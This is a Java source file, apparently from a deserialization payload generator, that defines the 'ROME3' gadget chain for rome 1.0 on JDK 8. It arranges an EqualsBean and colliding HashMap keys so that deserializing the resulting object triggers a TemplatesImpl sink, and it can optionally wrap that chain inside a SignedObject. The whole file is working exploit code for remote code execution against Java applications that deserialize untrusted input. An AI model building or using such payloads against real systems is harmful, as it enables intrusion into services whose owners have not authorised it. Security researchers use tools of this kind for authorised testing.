package com.ppp.chain.rome;

import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Dependencies;
import com.ppp.chain.WrapSerialization;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import com.sun.syndication.feed.impl.EqualsBean;

import javax.xml.transform.Templates;
import java.security.SignedObject;
import java.util.HashMap;
import java.util.Map;

/**
 * @author Whoopsunix
 *
 * JDK8
 */
@Dependencies({"rome:rome:1.0", "JDK>1.8"})
@Sink({Sink.TemplatesImpl})
public class ROME3 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(ROME3.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(Templates.class, sinkObject);

        // wrap
        if (sinksHelper.getWrapSerialization() != null) {
            Object signedObject = WrapSerialization.scheduler(kickOffObject, sinksHelper);
            kickOffObject = getChain(SignedObject.class, signedObject);
        }

        return kickOffObject;
    }

    public Object getChain(Class cls, Object object) throws Exception {
        EqualsBean bean = new EqualsBean(String.class, "");

        Map map1 = new HashMap();
        map1.put("aa", object);
        map1.put("bB", bean);

        Map map2 = new HashMap();
        map2.put("aa", bean);
        map2.put("bB", object);

        Reflections.setFieldValue(bean, "_beanClass", cls);
        Reflections.setFieldValue(bean, "_obj", object);

        return KickOff.makeMap(map1, map2);
    }
}
